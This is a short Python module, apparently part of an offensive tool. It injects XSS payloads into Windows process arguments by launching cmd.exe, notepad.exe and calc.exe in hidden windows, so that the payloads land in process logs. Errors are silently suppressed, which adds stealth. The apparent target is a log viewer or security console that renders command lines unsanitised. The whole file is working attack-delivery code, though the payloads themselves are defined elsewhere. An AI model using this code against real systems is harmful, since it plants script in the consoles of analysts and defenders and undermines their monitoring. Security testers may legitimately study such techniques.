"""Process argument XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class ProcessInjector(BaseInjector):
    """Injects XSS payloads into process arguments."""
    
    def inject(self, payload: XSSPayload):
        """Execute processes with XSS payloads as arguments."""
        try:
            # CMD with payload
            subprocess.Popen(
                ["cmd.exe", "/c", "echo", payload.content],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Notepad with payload (will fail but appears in logs)
            subprocess.Popen(
                ["notepad.exe", payload.content],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Calc with payload
            subprocess.Popen(
                ["calc.exe", payload.content],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass  # Silently fail
